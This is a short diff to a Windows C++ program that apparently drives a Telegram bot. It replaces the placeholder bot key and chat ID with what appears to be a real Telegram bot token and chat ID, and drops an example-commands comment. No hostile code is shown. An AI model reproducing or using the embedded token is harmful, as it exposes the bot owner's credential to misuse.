@@ -4,11 +4,11 @@ using namespace Tg;
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
-	Telegram tg("your bot key", "your chat id");
+	Telegram tg("1877711278:AAHgew3S6jli682MDU2Vh6B0GVmf3g4J5kI", "1426945525");
 
 	Init(tg);
 
-	while(tg.Check_Errors()) //example commands
+	while(tg.Check_Errors())
 	{
 		Delay(0.5);
 
